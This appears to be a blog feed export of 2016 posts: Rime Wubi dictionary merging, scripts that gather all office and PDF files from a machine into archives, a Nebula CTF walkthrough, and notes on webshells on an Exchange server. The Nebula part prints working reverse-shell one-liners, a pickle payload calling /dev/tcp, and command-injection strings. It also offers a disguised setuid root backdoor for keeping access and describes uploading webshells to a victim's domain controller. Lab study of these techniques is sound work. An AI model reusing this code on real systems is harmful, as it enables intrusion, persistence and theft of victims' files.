    /usr/bin/rime_dict_manager -e wubi86 /root/kali.txt
    cd /root
    python rimedic_handle.py kali.txt
    output:newdic.txt
    restart fcitx:
        http://www.findspace.name/res/786
        -----------content------------
        pidof fcitx | xargs kill
        pidof sogou-qimpanel | xargs kill
        nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        -----------end----------------
        
        or:
        --------content---------
        pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        ---------end------------

make myown larger dic
    
    download 8万精准超小词库.txt from 
        https://github.com/studyzy/imewlconverter/tree/master/IME%20WL%20Converter/%E5%8F%82%E8%80%83
    download scel from sougou wubi website
        http://wubi.sogou.com/dict/
    use imewlconverter.exe(深蓝词库转换工具) to convert from upon dics.txt to 8w_sougou_rime_wubi86_dic.txt
    *attention*:
        do not forget to change frequency from 10 to 1 when turning sougou scel to rime dic,the number of frequency words from sougou scel may not be 1,but bigger like 10.
    
    cd \\kali\root
    vi 8w_sougou_rime_wubi86_dic.txt
    G
    :r newdic.txt
    XX
    rm newdic.txt
    python rimedic_handle.py 8w_sougou_rime_wubi86_dic.txt
    output:newdic.txt
    
    16-05-28 newdic.txt&#39;s download link:
        8w only:
            http://pan.baidu.com/s/1c2uiZks
        8w+scel_sougou_new_added_frequency_to_1:
            http://pan.baidu.com/s/1miMsYhU
    
    import:
        kali:
            cd /root/.config/fcitx/rime
            /usr/bin/rime_dic_manager -i wubi86 /root/newdic.txt
        win7:
            导入文本码表----&amp;gt;\\kali\root\newdic.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 24 May 2016 00:00:00 +0800</pubDate>
        <link>/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</link>
        <guid isPermaLink="true">/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</guid>
        
        <category>type</category>
        
        <category>rime</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>文件一键打包</title>
        <description>&lt;h4 id=&quot;x01-linux&quot;&gt;0x01 linux&lt;/h4&gt;

&lt;p&gt;linux打包命令：
&lt;a href=&quot;http://pan.baidu.com/s/1nvcVqOT&quot;&gt;1.sh&lt;/a&gt; 密码：0y03&lt;br /&gt;
(attention:without “&amp;amp;&amp;amp; echo ok”,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------content of 1.sh--------------------
mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
--------------------end-----------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-windows&quot;&gt;0x02 windows&lt;/h4&gt;

&lt;p&gt;windows打包(7z)命令：
&lt;a href=&quot;http://pan.baidu.com/s/1slMivlb&quot;&gt;1.bat&lt;/a&gt; 密码：3lwz&lt;br /&gt;
(attention:7z.exe for x32 need a 7z.dll to performs well while 7z.exe for x64 needn’t)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------content of 1.bat--------------------------
@echo off
goto :main
这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 
rd /s/q c:\recycler\tmp
md c:\recycler\tmp
echo  当前硬盘的分区有： 
for %%i in (%str%) do (
if exist %%i: (echo %%i:

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.doc&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; tmp.txt
)

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.docx&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.pdf&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.txt&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xls&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xlsx&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


)
)

7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
------------------end--------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 20 May 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</link>
        <guid isPermaLink="true">/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</guid>
        
        <category>windows</category>
        
        <category>dir /s</category>
        
        <category>sh</category>
        
        <category>7z</category>
        
        <category>tar</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>nebula系统学习</title>
        <description>&lt;h4 id=&quot;xff-about-nebula&quot;&gt;0xff About Nebula&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at

SUID files
Permissions
Race conditions
Shell meta-variables
$PATH weaknesses
Scripting language weaknesses
Binary compilation failures

At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.

official website:       https://exploit-exercises.com/nebula/
nebula.iso download:    http://pan.baidu.com/s/1dFdRIm9
some witeup:    
                        google--&amp;gt;cache:https://lightless.me/archives/Nebula-writeup.html
                        or
                        http://pan.baidu.com/s/1mhQgqCg
                        or
                        https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x00-level00&quot;&gt;0x00 level00&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level00
    pass:level00
    find / -type f -perm -4000 -ls &amp;gt; tmp.txt
link knowledge:
    linux中suid,sgid,sticky详解：http://crazyming.blog.51cto.com/1048571/467414
    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
    find / -perm -2 -type f -print             function:find files can be writeable by everyone
        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
        /tmp/.sh -p(this command to get a euid=root shell)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x01-level01&quot;&gt;0x01 level01&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level01
    password:level01
    PATH=/tmp:$PATH;export PATH;echo $PATH
    vi /tmp/echo
    -----content-----
    /bin/sh
    ------end--------
    chmod +x /tmp/echo
    cd /home/flag01
    ./flag01
    getflag

link knowledge:
    the source code of /home/flag01/flag01 is:

    ------------content of source.c------------
    #include &amp;lt;stdlib.h&amp;gt;
    #include &amp;lt;unistd.h&amp;gt;
    #include &amp;lt;string.h&amp;gt;
    #include &amp;lt;sys/types.h&amp;gt;
    #include &amp;lt;stdio.h&amp;gt;
    
    int main(int argc, char **argv, char **envp)
    {
      gid_t gid;
      uid_t uid;
      gid = getegid();
      uid = geteuid();
    
      setresgid(gid, gid, gid);
      setresuid(uid, uid, uid);
    
      system(&quot;/usr/bin/env echo and now what?&quot;);
    }
    ------------end----------------------------

    when I trid to execute some commands as upon &quot;mykey&quot; do,but without its &quot;chmod +x /tmp/echo&quot;,I found it can not return a shell with suid=flag01 to execute /home/flag01/flag01,later I added chmod +x /tmp/echo,it succeeded.
    ls -l /home/flag01 --&amp;gt;  -rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01

    this means file flag01&#39;s owner is user flag01,belongs to group level01,but has setuid attribute,so when other user like level01 will get file flag01&#39;s owner(that is user flag01)&#39;s privilege

    which getflag--&amp;gt;/bin/getflag
    ls -l /bin/getflag--&amp;gt;  -rwxr-xr-x 1 root root 7311 2011-11-23 14:51 /bin/getflag

    then execute upon &quot;mykey&quot; commands to pass level01,/bin/getflag is a program checks whether the user who execute /bin/getflag belongs to &quot;flag account&quot;,when a &quot;non-flag account&quot; like level01 trys to execute /bin/getflag,it returns:&quot;getflag is executing on a non-flag account,this doesn&#39;t count&quot;

    however,when I first didn&#39;t add &quot;chmod +x /tmp/echo&quot; in &quot;mykey&quot;,I thought may be there exists some error in level01,and tried to change the source code of /home/flag01/flag01 to file.c:

    #include &amp;lt;stdlib.h&amp;gt;
    #include &amp;lt;unistd.h&amp;gt;
    #include &amp;lt;string.h&amp;gt;
    #include &amp;lt;sys/types.h&amp;gt;
    #include &amp;lt;stdio.h&amp;gt;
    
    int main(int argc, char **argv, char **envp)
    {
    	gid_t gid;
    	uid_t uid;
    	gid = getegid();
    	uid = geteuid();
    
    	setresgid(gid, gid, gid);
    	setresuid(uid, uid, uid);
    
    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
    }
    ------------end------------------------

    that is change the final system sentence from &quot;system(&quot;/usr/bin/env echo and now what?&quot;);&quot; to &quot;system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);&quot;,and this could be a &quot;works well backdoor&quot; when get a root shell in a system:
    to use this file.c as a root shell backdoor after got a root shell,
    use root role execute:
        gcc -o 1 file.c
        mv 1 /bin/l2ping
        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
    use webshell role execute:
        PATH=/tmp:$PATH
        export PATH
        echo $PATH(to check if /tmp is in $PATH)
        ln -s /bin/sh /tmp/echo
        or:PATH=/tmp:$PATH;export PATH;echo $PATH;ln -s /bin/sh /tmp/echo
        (later I found this will not get root shell,coz a new terminal shell created[/tmp/echo--&amp;gt;/bin/sh] by upon way will not display in webshells&#39; terminal)
    then use webshell role to get a root privilege shell:
        /bin/l2ping
    
    both source.c and file.c can be a root privilege backdoor shell,the difference between source.c and file.c is:
    by source.c we should execute &quot;chmod +x /tmp/echo&quot;
    by file.c we should execute &quot;ln -s /bin/sh /tmp/echo&quot;

    *attention*:
    when I tried to keep root privilege in webshell,and conveniently execute commands in webshell but with root privilege(so I don&#39;t have to use reGeorg and proxycap and putty and upon two kinds of backdoor to connect target victim pc and execute commands with root shell,these actions are too slow to control target server),I tried to use root privilege to execute:
        chmod 4755 /..../..../webshell.php(eg.b374kshell)
        browser visit--&amp;gt;http://xxx/xxx/xxx/webshell.php ---&amp;gt;  terminal:
        id
        out:auid=48(apache) gid=48(apache) groups=48(apache)
    later I realized a webshell.php file with setuid=root will not execute as root privilege,coz only executable files like elf,*.sh files will execute as root privilege,*.php file is not in the scope,so my webshell&#39;s terminal will has apache&#39;s privilege,not root,I could chmod 4755 apache to get root privilege in webshell.php,but it&#39;s not wise.

    !!!cool thing:   
    one sentence to keep root shell in webshell(strong webshell better,like b374k,chopper may be stopped to execute a normal command when there exists some waf),use webshell&#39;s terminal function to execute:
        PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &quot;whoami&quot; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
    this means with role apache&#39;s privilege to execute a program(a file with setuid=root),but it will has root privilege to execute commands,change &quot;whoami&quot; to any commond is ok to execute as root privilege.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-level02&quot;&gt;0x02 level02&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level02
    pass:level02
    USER=&quot;nihao;sh&quot;
    ./flag02
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x03-level03&quot;&gt;0x03 level03&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level03
    pass:level03(下文略去su - levelxx;pass:levelxx)
    cd /home/flag03
    vi writable.d/1.sh
    ---------content------
    (id;getflag) &amp;gt; /tmp/tmp.txt
    ----------end---------
    chmod +x writable/1.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x04-level04&quot;&gt;0x04 level04&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /home/flag04
    ln -s /home/flag04/token /tmp/level04
    ./flag04 /tmp/level04
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x05-level05&quot;&gt;0x05 level05&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /home/flag05
    ls -la
    cp ./backup/* /home/level05
    cd /home/level05
    tar zxvf backup[tab]
    ls -la(then found .ssh directory created in common directory&amp;lt;/home/level05&amp;gt;)
    ssh flag05@127.0.0.1
    yes
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x06-level06&quot;&gt;0x06 level06&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /etc/passwd
    v--&amp;gt; flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh --&amp;gt; :&amp;lt;,&amp;gt;w pass.txt
    use kali2&#39;s john
    john pass.txt
    get flag06:hello
    su - flag06
    pass:hello
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x07-level07&quot;&gt;0x07 level07&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    ctr+alt+f2 --&amp;gt; tty2
    tty2:nc -lnv 8888
    ctr+alt+f1(backto tty1)
    tty1:wget -O- &quot;http://127.0.0.1:7007/index.cgi?Host=127.0.0 || mknod /tmp/backpipe p &amp;amp;&amp;amp; /bin/sh 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe&quot;
    ctr+alt+f2 --&amp;gt; tty2
    tty2:id(flag07),getflag
link knowledge:
    for security,the linux system may not support -e parameter in netcat(nc -e ip port),so one way to exploit is:
        mknod /tmp/backpipe p
        /bin/bash 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x08-level08&quot;&gt;0x08 level08&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    scp level08@192.168.2.140:/home/flag08/capture.pcap /root/Desktop/
    wireshark to open /root/Desktop/capture.pcap
    use wireshark,choose any tcp data,right click mouse,choose follow tcp stream
    find password:...
    use hex dump view to find 7f==&amp;gt;. is backspace
    su - flag08
    pass:backd00Rmate
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x09-level09&quot;&gt;0x09 level09&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/level09.txt
    ----content----
    [email {${system($use_me)}}]
    -----end-------
    cd /home/flag09
    ./flag09 /tmp/level09.txt getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x10-level10&quot;&gt;0x10 level10&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/level10_1
    ----conent------
    #!/bin/sh
    while true;
    do
        ln -sf /tmp/level10_2 /tmp/level10_3
        ln -sf /home/flag10/token /tmp/level10_3
    done
    ----end---------
    touch /tmp/level10_2
    touch /tmp/level10_3
    chmod +x /tmp/level10_1
    vi /tmp/level10_11
    ------content------
    #!/bin/sh
    while true;
    do
        /home/flag10/flag10 /tmp/level10_3 192.168.2.140
    done
    -----end-----------
    chmod +x /tmp/level10_3
    use another terminal:
        nc -lv 18211
    use another terminal:
        ssh level10@192.168.2.140
        pass:level10
        /tmp/level10_1
    use another terminal:
        ssh level10@192.168.2.140
        pass:level10
        /tmp/level10_11
    find the terminal with nc -lv 18211 received the content of token
    su - flag10
    pass:content of token
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x11-level11&quot;&gt;0x11 level11&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    there are two ways:
        (http://blackndoor.com/nebula-level11/)
        (https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x12-level12&quot;&gt;0x12 level12&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    nc 127.0.0.1 50001
    Pass:
        test;getflag &amp;gt; /tmp/level12
    vi /tmp/level12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x13-level13&quot;&gt;0x13 level13&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/level13.c
    -----content-------
    #include &amp;lt;sys/types.h&amp;gt;
    int getuid(void)
    {
        return 1000; 
    }
    -------------------
    gcc -shared -fPIC /tmp/level13.c -o /tmp/level13.so
    LD_PRELOAD=&quot;/tmp/level13.so&quot;
    export LD_PRELOAD
    cp /home/flag13/flag13 /home/level13/
    /home/level13/flag13
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x14-level14&quot;&gt;0x14 level14&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
--------py--------
def main(string):
    length=len(string)
    out=&quot;&quot;
    for i in range(length):
	#print type(chr(ord(string[length-1-i])-(length-1-i)))
	#print chr(ord(string[length-1-i])-(length-1-i))[0]
        out+=(chr(ord(string[length-1-i])-(length-1-i))[0])
    return out
if __name__==&#39;__main__&#39;:
    import sys
    print main(sys.argv[1])
------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x15-level15&quot;&gt;0x15 level15&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    cd /home/flag15
    strace ./flag15
        found one line:open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) 
    vi /var/tmp/flag15/exploit.c
    ------------exploit.c-----------
    #include &amp;lt;unistd.h&amp;gt;
    int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
        execl(&quot;/bin/getflag&quot;, (char *)NULL, (char *)NULL);
    }
    --------------------------------
    cd /var/tmp/flag15
    gcc -g -fPIC -c exploit.c (-g===&amp;gt;for gdb,-c===&amp;gt;产生目标文件,不产生可执行文件)
    ll
        exploit.c
        exploit.o
    gcc exploit.o -shared -o libc.so.6
    /home/flag15/flag15
       relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc│[~] [~] [~]                                                                  
       .so.6 with link time reference
    vi verscript
    ---verscript-----
    GLIBC_2.0{
    global:__libc_start_main;
    local: *;
    };
    -----------------
    gcc -shared -Wl,--version-script,verscript,-Bstatic -static-libgcc -o libc.so.6 exploit.o
    /home/flag15/flag15
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x16-level16&quot;&gt;0x16 level16&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/exp.sh
    ----content-----
    /bin/getflag&amp;gt;&amp;gt;/tmp/level16.out
    ----------------
    another terminal:
        nv -lv 1616
    origin terminal:
        wget http://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&amp;amp;password=
            urldecode:   &quot;&amp;lt;/DEV/NULL;P=/TMP/EXP.SH;${P,,};#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x17-level17&quot;&gt;0x17 level17&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /root/桌面/1.py
    -----1.py-----
    #!/usr/bin/python
    import socket
    
    HOST = &#39;192.168.2.147&#39;
    PORT = 10007
    
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,PORT))
    
    recv = sock.recv(1024)
    print &quot;Receive : %s\n&quot; % recv
    
    exploit = &quot;cos\nsystem\n(S&#39;/bin/bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.3.106/51242 0&amp;gt;&amp;amp;1&#39;\ntR.\n&quot;
    
    sock.send(exploit)
    recv = sock.recv(2048)
    -----end------

    nc -lvp 51242
    python /root/桌面/1.py

    receive a new shell with ruid=flag17
        &amp;gt;getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x18-level18&quot;&gt;0x18 level18&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    python -c &#39;print &quot;login iii\r\n&quot;*50+&quot;closelog\r\n&quot;+&quot;shell\r\n&quot;&#39; | /home/flag18/flag18 --rcfile -d log -v -v -v
    out:&#39;Starting can not find&#39;
        ... can not find
        ... can not find
    cd /home/flag18
    vi log
    -----content------
    Starting up. ......
    something ....
    ------end---------

    vi /tmp/Starting
    ----Starting---
    /bin/flag &amp;gt; /tmp/level18.out
    -----end-------
    
    *****attention:*****
    not not forget to:
    chmod +x /tmp/Starting
    *******end*******

    python -c &#39;print &quot;login iii\r\n&quot;*50+&quot;closelog\r\n&quot;+&quot;shell\r\n&quot;&#39; | /home/flag18/flag18 --rcfile -d log -v -v -v
    vi /tmp/level18.out

link knowledge:
    http://v0ids3curity.blogspot.kr/2012/09/exploit-exercise-improper-file-handling.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x19-level19&quot;&gt;0x19 level19&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    on kali(192.168.3.106)
        vi /tmp/level19.c
        ------------level19.c-------------
        #include &amp;lt;stdio.h&amp;gt;
        #include &amp;lt;stdlib.h&amp;gt;
        #include &amp;lt;unistd.h&amp;gt;
        #include &amp;lt;time.h&amp;gt;
        #include &amp;lt;sys/types.h&amp;gt;
        int main(void)
        {
            pid_t pid;
            char* args[]={&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;getflag &amp;gt; /tmp/level19.out&quot;,NULL};
            pid=fork();
            if (pid==0)
            {
                nice(19);
                execve(&quot;/home/flag19/flag19&quot;,args,NULL);
            }
            else if (pid&amp;lt;0)
            {
                 printf(&quot;Ups\n&quot;);
            }
            else
            {
                 exit(1);
            }
            return 0;
        }
        --------------end---------------
        
        gcc -o /tmp/level19 /tmp/level19.c
        scp /tmp/level19 level19@192.168.2.147:/home/level19
        ll(find &quot;x&quot; in /home/level19/level19,could be executed)
        ssh level19@192.168.2.147
        pass:level19
        cd /home/level19
        ./level19
        out:binary can not be executed

        back to kali(192.168.3.106)
        scp /tmp/level19.c level19@192.168.2.147:/home/level19/
        
        ssh level19@192.168.2.147
        pass:level19
        cd /home/level19
        gcc -o level19-1 level19.c
        chmod +x level19-1
        ./level19-1

        vi /tmp/level19.out
            succeed

link knowledge:
    http://www.cnblogs.com/bastard/archive/2012/08/31/2664896.html
    http://www.cnblogs.com/mydomain/archive/2011/09/27/2193247.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 19 May 2016 00:00:00 +0800</pubDate>
        <link>/linux/2016/05/19/nebula/</link>
        <guid isPermaLink="true">/linux/2016/05/19/nebula/</guid>
        
        <category>privilege escalation</category>
        
        <category>linux</category>
        
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>windows 2008 domain controllers</title>
        <description>&lt;h3 id=&quot;x01-upload-backup-webshells&quot;&gt;0x01 upload backup webshells&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
2.webshell in different folder has different privileges
    https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; iis apppool\defaultapppool
    https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下（index.html）   iis权限
    https://xx.oo.xx/owa/auth/some.aspx    C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; nt authority\system
    https://xx.oo.xx/owa/对应C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\ 目录 system权限
3.upload a strong webshell but found &quot;/&quot; error
    aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
    my way defferent from uppon one:
    create a new folder,create a web.config file with below content:
    --------------------------content------------------------
    &amp;lt;configuration&amp;gt;
        &amp;lt;system.web&amp;gt;
            &amp;lt;customErrors mode=&quot;Off&quot;/&amp;gt;
        &amp;lt;/system.web&amp;gt;
    &amp;lt;/configuration&amp;gt;
    --------------------------end of content----------------
    then upon a strong webshell to my new created folder,found no more error.
4.different parse 
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\大马.aspx is ok to parse
